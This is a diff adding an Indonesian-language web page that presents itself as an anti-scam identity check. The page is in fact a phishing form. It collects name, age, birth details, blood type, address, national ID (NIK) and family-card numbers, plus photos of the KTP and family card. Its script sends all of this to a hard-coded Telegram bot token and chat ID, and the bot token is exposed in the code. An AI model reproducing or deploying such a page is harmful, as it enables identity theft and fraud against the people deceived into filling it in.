@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Identification - NathzZ</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .gradient-bg {
+      background: linear-gradient(to right, #2c3e50, #4ca1af);
+    }
+    .hidden { display: none; }
+  </style>
+</head>
+<body class="min-h-screen flex items-center justify-center gradient-bg text-white">
+
+  <!-- POPUP -->
+  <div id="popup" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50">
+    <div class="bg-white text-black p-6 rounded-xl max-w-md text-center shadow-lg">
+      <h1 class="text-2xl font-bold mb-4">Identification of Personal Data</h1>
+      <p class="mb-4 text-sm">Created by NathzZ</p>
+      <p class="mb-4 text-sm">Fungsi dari web ini adalah untuk mencegah adanya scam atau penipuan dalam transaksi.</p>
+      <button onclick="document.getElementById('popup').classList.add('hidden')" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">
+        Oke
+      </button>
+    </div>
+  </div>
+
+  <!-- FORM CONTAINER -->
+  <div class="bg-white text-black p-6 rounded-xl w-full max-w-xl shadow-lg" id="formContainer">
+    <div id="step1">
+      <h2 class="text-xl font-bold mb-4">Langkah 1: Data Pribadi</h2>
+      <div class="space-y-3">
+        <input class="w-full border px-3 py-2 rounded" placeholder="Nama Lengkap" id="nama"/>
+        <input class="w-full border px-3 py-2 rounded" placeholder="Umur" id="umur"/>
+        <input class="w-full border px-3 py-2 rounded" placeholder="Tempat, Tanggal Lahir" id="ttl"/>
+        <input class="w-full border px-3 py-2 rounded" placeholder="Golongan Darah" id="gol_darah"/>
+        <input class="w-full border px-3 py-2 rounded" placeholder="Alamat" id="alamat"/>
+        <input class="w-full border px-3 py-2 rounded" placeholder="NIK" id="nik"/>
+        <input class="w-full border px-3 py-2 rounded" placeholder="Nomor KK" id="kk"/>
+        <button onclick="goToStep(2)" class="bg-blue-600 text-white px-4 py-2 rounded w-full">Lanjutkan</button>
+      </div>
+    </div>
+
+    <div id="step2" class="hidden">
+      <h2 class="text-xl font-bold mb-4">Langkah 2: Upload Foto Kartu Keluarga</h2>
+      <input type="file" id="fotoKK" accept="image/*" class="w-full mb-4"/>
+      <button onclick="goToStep(3)" class="bg-blue-600 text-white px-4 py-2 rounded w-full">Lanjutkan</button>
+    </div>
+
+    <div id="step3" class="hidden">
+      <h2 class="text-xl font-bold mb-4">Langkah 3: Upload Foto KTP</h2>
+      <input type="file" id="fotoKTP" accept="image/*" class="w-full mb-4"/>
+      <button onclick="submitData()" class="bg-green-600 text-white px-4 py-2 rounded w-full">Selesai dan Kirim</button>
+    </div>
+  </div>
+
+  <!-- LOADING / SUCCESS -->
+  <div id="loadingPopup" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 hidden">
+    <div class="bg-white p-6 rounded-xl text-center text-black">
+      <p id="loadingText" class="text-lg mb-2">Mengirim data...</p>
+      <div class="loader border-4 border-blue-500 border-t-transparent rounded-full w-8 h-8 mx-auto animate-spin"></div>
+    </div>
+  </div>
+
+  <div id="successPopup" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 hidden">
+    <div class="bg-white p-6 rounded-xl text-center text-green-700">
+      <div class="text-4xl mb-2">✅</div>
+      <p class="text-lg font-bold mb-2">Terkirim!</p>
+      <p>Data anda sudah diterima dan dikirim ke Telegram.<br/>Anda dapat melanjutkan transaksi tanpa adanya scammer/penipuan.<br/>Terima kasih.</p>
+    </div>
+  </div>
+
+  <script>
+    function goToStep(step) {
+      for (let i = 1; i <= 3; i++) {
+        document.getElementById("step" + i).classList.add("hidden");
+      }
+      document.getElementById("step" + step).classList.remove("hidden");
+    }
+
+    async function submitData() {
+      const nama = document.getElementById('nama').value;
+      const umur = document.getElementById('umur').value;
+      const ttl = document.getElementById('ttl').value;
+      const gol = document.getElementById('gol_darah').value;
+      const alamat = document.getElementById('alamat').value;
+      const nik = document.getElementById('nik').value;
+      const kk = document.getElementById('kk').value;
+      const fotoKK = document.getElementById('fotoKK').files[0];
+      const fotoKTP = document.getElementById('fotoKTP').files[0];
+
+      if (!fotoKK || !fotoKTP) {
+        alert("Silakan upload semua foto yang diminta.");
+        return;
+      }
+
+      document.getElementById('loadingPopup').classList.remove('hidden');
+
+      const token = "7774212563:AAExdwi-SFBOwr1hXfe4krnd5SoS6E-sucM";
+      const chatId = "6631076203";
+
+      const textMessage = `
+<b>DATA IDENTIFIKASI</b>
+Nama: ${nama}
+Umur: ${umur}
+TTL: ${ttl}
+Gol. Darah: ${gol}
+Alamat: ${alamat}
+NIK: ${nik}
+No KK: ${kk}
+`;
+
+      // Kirim teks
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: textMessage,
+          parse_mode: "HTML"
+        })
+      });
+
+      // Kirim foto KK
+      let formDataKK = new FormData();
+      formDataKK.append("chat_id", chatId);
+      formDataKK.append("photo", fotoKK);
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formDataKK
+      });
+
+      // Kirim foto KTP
+      let formDataKTP = new FormData();
+      formDataKTP.append("chat_id", chatId);
+      formDataKTP.append("photo", fotoKTP);
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formDataKTP
+      });
+
+      document.getElementById('loadingPopup').classList.add('hidden');
+      document.getElementById('successPopup').classList.remove('hidden');
+    }
+  </script>
+</body>
+</html>
